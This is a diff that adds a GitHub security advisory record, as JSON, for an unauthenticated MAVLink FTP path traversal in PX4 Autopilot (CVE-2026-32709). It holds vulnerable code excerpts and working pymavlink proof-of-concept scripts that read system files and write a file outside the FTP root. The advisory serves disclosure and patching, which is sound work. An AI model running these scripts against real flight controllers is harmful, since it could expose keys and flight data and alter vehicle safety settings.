@@ -1,0 +1,119 @@
+{
+  "ghsa_id": "GHSA-fh32-qxj9-x32f",
+  "cve_id": "CVE-2026-32709",
+  "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-fh32-qxj9-x32f",
+  "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-fh32-qxj9-x32f",
+  "summary": "PX4 Autopilot MAVLink FTP Unauthenticated Path Traversal (Arbitrary File Read/Write/Delete)",
+  "description": "### Summary\r\n\r\nAn unauthenticated path traversal vulnerability in the PX4 Autopilot MAVLink FTP implementation allows any MAVLink peer to read, write, create, delete, and rename arbitrary files on the flight controller filesystem without authentication. On NuttX targets, the FTP root directory is an empty string, meaning attacker-supplied paths are passed directly to filesystem syscalls with no prefix or sanitization for read operations. On POSIX targets (Linux companion computers, SITL), the write-path validation function unconditionally returns `true`, providing no protection. A TOCTOU race condition in the write validation on NuttX further allows bypassing the only existing guard. CVSS 9.8 Critical.\r\n\r\n### Details\r\n\r\nThe vulnerability exists in multiple interacting components of `src/modules/mavlink/mavlink_ftp.cpp` and `src/modules/mavlink/mavlink_ftp.h`.\r\n\r\n**1. Empty root directory on NuttX (`mavlink_ftp.h:202-209`)**\r\n\r\nThe FTP root directory is set to `PX4_ROOTFSDIR`, which on NuttX is defined as `\"\"` (empty string) in `platforms/common/include/px4_platform_common/defines.h:66`:\r\n\r\n```cpp\r\n// mavlink_ftp.h:207\r\nstatic constexpr const char _root_dir[] = PX4_ROOTFSDIR;  // \"\" on NuttX\r\nstatic constexpr const int _root_dir_len = sizeof(_root_dir) - 1;  // 0\r\n```\r\n\r\nThe developers acknowledge this in a source code comment at `mavlink_ftp.h:203`:\r\n```cpp\r\n// Note that requests can still fall outside of the root dir by using ../..\r\n```\r\n\r\n**2. No path validation on read operations (`mavlink_ftp.cpp:361-500, 502-553`)**\r\n\r\nThe read-path operations (`_workList`, `_workOpen` with `O_RDONLY`, `_workRead`, `_workBurst`, `_workCalcFileCRC32`) never call `_validatePathIsWritable`. They call only `_constructPath`, which prepends the (empty) root directory and does no canonicalization or traversal filtering:\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:504-536 -- _workOpen: NO path validation for ANY open mode\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workOpen(PayloadHeader *payload, int oflag)\r\n{\r\n    if (_session_info.fd >= 0) {\r\n        return kErrNoSessionsAvailable;\r\n    }\r\n    _constructPath(_work_buffer1, _work_buffer1_len, _data_as_cstring(payload));\r\n    // ... no _validatePathIsWritable call ...\r\n    int fd = ::open(_work_buffer1, oflag, PX4_O_MODE_666);  // Opens attacker-controlled path\r\n}\r\n```\r\n\r\n**3. Write validation disabled on POSIX (`mavlink_ftp.cpp:1150-1164`)**\r\n\r\nThe `_validatePathIsWritable` function is compiled out on all non-NuttX platforms:\r\n\r\n```cpp\r\nbool MavlinkFTP::_validatePathIsWritable(const char *path)\r\n{\r\n#ifdef __PX4_NUTTX\r\n    if (strncmp(path, CONFIG_BOARD_ROOT_PATH \"/\", 12) != 0 || strstr(path, \"/../\") != nullptr) {\r\n        return false;\r\n    }\r\n#endif\r\n    return true;  // <-- Unconditionally returns true on POSIX (Linux, macOS)\r\n}\r\n```\r\n\r\n**4. TOCTOU bypass of NuttX write validation (`mavlink_ftp.cpp:511, 623, 363`)**\r\n\r\nOn NuttX, write validation occurs in `_workWrite` (line 623) but NOT in `_workOpen` (line 511). Both share `_work_buffer1`, which is overwritten by any intervening operation such as `_workList` (line 363). An attacker can:\r\n\r\n1. `kCmdCreateFile` with malicious path -> `_workOpen` creates file at attacker path (no validation), stores path in `_work_buffer1`\r\n2. `kCmdListDirectory` with safe path -> `_workList` overwrites `_work_buffer1` with safe path\r\n3. `kCmdWriteFile` -> `_workWrite` validates `_work_buffer1` (safe path) -> passes -> writes to malicious fd from step 1\r\n\r\n**5. No authentication (`mavlink_ftp.cpp:135-136`)**\r\n\r\nThe FTP handler accepts messages from any system with matching or broadcast (0) target IDs:\r\n\r\n```cpp\r\nif ((ftp_request.target_system == _getServerSystemId() || ftp_request.target_system == 0) &&\r\n    (ftp_request.target_component == _getServerComponentId() || ftp_request.target_component == 0)) {\r\n    _process_request(&ftp_request, msg->sysid, msg->compid);\r\n}\r\n```\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n- MAVLink communication channel to a PX4 flight controller (serial/USB/UDP/TCP)\r\n- A MAVLink-capable tool such as `pymavlink`\r\n\r\n**Reproducing arbitrary file read on NuttX:**\r\n\r\n```python\r\nfrom pymavlink import mavutil\r\nimport struct, time\r\n\r\n# Connect to PX4 (adjust connection string)\r\nmav = mavutil.mavlink_connection('udp:127.0.0.1:14540')\r\nmav.wait_heartbeat()\r\n\r\nTARGET_SYSTEM = mav.target_system\r\nTARGET_COMPONENT = mav.target_component\r\n\r\ndef make_payload(seq, session, opcode, size, req_opcode, burst_complete, padding, offset, data=b''):\r\n    header = struct.pack('<HBBBBBxI', seq, session, opcode, size, req_opcode, burst_complete, offset)\r\n    return header + data\r\n\r\n# Step 1: List root filesystem (NuttX: root_dir is \"\")\r\n# kCmdListDirectory = 3\r\npath = b'/fs\\x00'\r\npayload = make_payload(seq=0, session=0, opcode=3, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# Step 2: Open /proc/version for reading (kCmdOpenFileRO = 4)\r\npath = b'/proc/version\\x00'\r\npayload = make_payload(seq=1, session=0, opcode=4, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# Step 3: Read file contents (kCmdReadFile = 5)\r\npayload = make_payload(seq=2, session=0, opcode=5, size=239,\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0)\r\n\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\n\r\n# Receive and print response\r\nwhile True:\r\n    msg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\n    if msg is None:\r\n        break\r\n    resp_payload = bytes(msg.payload)\r\n    opcode = resp_payload[3]\r\n    if opcode == 128:  # kRspAck\r\n        size = resp_payload[4]\r\n        data = resp_payload[12:12+size]\r\n        print(f\"Read {size} bytes: {data}\")\r\n        break\r\n    elif opcode == 129:  # kRspNak\r\n        print(f\"NAK error: {resp_payload[12]}\")\r\n        break\r\n```\r\n\r\n**Reproducing arbitrary file write on POSIX (SITL/companion):**\r\n\r\n```python\r\n# Step 1: Create file outside root using path traversal\r\n# kCmdCreateFile = 6\r\npath = b'../../tmp/pwned\\x00'\r\npayload = make_payload(seq=0, session=0, opcode=6, size=len(path),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=path)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\ntime.sleep(0.5)\r\n\r\n# Step 2: Write data (kCmdWriteFile = 7)\r\ndata = b'EXPLOITED\\x00'\r\npayload = make_payload(seq=1, session=0, opcode=7, size=len(data),\r\n                       req_opcode=0, burst_complete=0, padding=0, offset=0, data=data)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYSTEM, TARGET_COMPONENT, ftp_msg)\r\n# File /tmp/pwned is now created with content \"EXPLOITED\"\r\n```\r\n\r\n### Impact\r\n\r\nThis is an **unauthenticated arbitrary file read/write/delete vulnerability** affecting all PX4 Autopilot deployments that expose a MAVLink interface (which is virtually all of them).\r\n\r\n**Who is impacted:**\r\n- All PX4 vehicles with any MAVLink link (telemetry radio, USB, WiFi, cellular, companion computer)\r\n- Operators of drones, fixed-wing aircraft, VTOL, rovers, and submarines running PX4\r\n\r\n**What an attacker can do:**\r\n- **Read** any file on the flight controller (configuration, logs, cryptographic keys, parameters)\r\n- **Write/create** arbitrary files (plant malicious scripts, modify configuration, overwrite firmware)\r\n- **Delete** files (remove logs to cover tracks, corrupt filesystem to cause crashes)\r\n- **Exfiltrate** mission plans, geofence configurations, and flight logs containing GPS tracks\r\n- **Overwrite** parameter files to alter vehicle behavior (disable safety checks, change geofences)\r\n\r\n**Physical safety impact:** Modifying configuration files or parameters could cause loss of vehicle control, crashes, or override geofence boundaries in populated areas.",
+  "severity": "medium",
+  "author": null,
+  "publisher": {
+    "login": "mrpollo",
+    "id": 317648,
+    "node_id": "MDQ6VXNlcjMxNzY0OA==",
+    "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/mrpollo",
+    "html_url": "https://github.com/mrpollo",
+    "followers_url": "https://api.github.com/users/mrpollo/followers",
+    "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+    "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+    "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+    "repos_url": "https://api.github.com/users/mrpollo/repos",
+    "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-fh32-qxj9-x32f",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-32709",
+      "type": "CVE"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-03-13T19:52:34Z",
+  "published_at": "2026-03-13T19:52:34Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "other",
+        "name": "PX4/PX4-Autopilot"
+      },
+      "vulnerable_version_range": "<= 1.17.0-rc1",
+      "patched_versions": "1.17.0-rc2",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "score": 5.4
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-22",
+      "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+    }
+  ],
+  "cwe_ids": [
+    "CWE-22"
+  ],
+  "credits": [
+    {
+      "login": "dxlerYT",
+      "type": "reporter"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "dxlerYT",
+        "id": 73416867,
+        "node_id": "MDQ6VXNlcjczNDE2ODY3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/73416867?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/dxlerYT",
+        "html_url": "https://github.com/dxlerYT",
+        "followers_url": "https://api.github.com/users/dxlerYT/followers",
+        "following_url": "https://api.github.com/users/dxlerYT/following{/other_user}",
+        "gists_url": "https://api.github.com/users/dxlerYT/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/dxlerYT/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/dxlerYT/subscriptions",
+        "organizations_url": "https://api.github.com/users/dxlerYT/orgs",
+        "repos_url": "https://api.github.com/users/dxlerYT/repos",
+        "events_url": "https://api.github.com/users/dxlerYT/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/dxlerYT/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "comments": 1,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "score": 5.4
+  }
+}
